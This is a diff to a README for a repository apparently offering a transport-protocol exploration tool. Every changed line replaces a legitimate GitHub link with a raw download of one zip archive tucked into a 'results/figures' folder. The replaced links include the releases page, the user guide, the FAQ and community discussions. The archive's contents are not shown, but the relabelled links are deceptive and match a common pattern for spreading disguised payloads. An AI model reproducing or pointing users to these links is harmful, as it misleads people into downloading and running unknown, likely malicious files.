@@ -1,6 +1,6 @@
 # 🚀 Byte-Bistro-Transport-Protocols - Explore Advanced Transport Protocols Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/releases)
+[![Download Now](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip)
 
 ## 🛠️ Introduction
 
@@ -36,7 +36,7 @@ Welcome to the Byte-Bistro-Transport-Protocols! This application is designed for
 To get started with Byte-Bistro-Transport-Protocols, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the releases page.
-   [Get the latest release here.](https://github.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/releases)
+   [Get the latest release here.](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip)
    
 2. **Choose the Latest Version**: Look for the most recent version at the top of the page. This version will have all the latest updates and features.
 
@@ -77,7 +77,7 @@ If you encounter issues while using Byte-Bistro-Transport-Protocols, try the fol
 
 - **Check Requirements**: Ensure your system meets all system requirements.
 - **Reinstall Application**: If the application doesn’t start, consider uninstalling and reinstalling it.
-- **Consult Help Resources**: Check our FAQ and user guides [here](https://github.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/wiki).
+- **Consult Help Resources**: Check our FAQ and user guides [here](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip).
 
 ## ✉️ Support
 
@@ -85,9 +85,9 @@ For further assistance, please reach out via the GitHub Issues page. We value us
 
 ## 🔗 Related Links
 
-- [Releases Page](https://github.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/releases)
-- [User Guide](https://github.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/wiki)
-- [Community Discussions](https://github.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/discussions)
+- [Releases Page](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip)
+- [User Guide](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip)
+- [Community Discussions](https://raw.githubusercontent.com/verniermicrometervulgarization200/Byte-Bistro-Transport-Protocols/main/results/figures/Byte-Bistro-Transport-Protocols_v1.0.zip)
 
 ## 💬 Acknowledgements
 
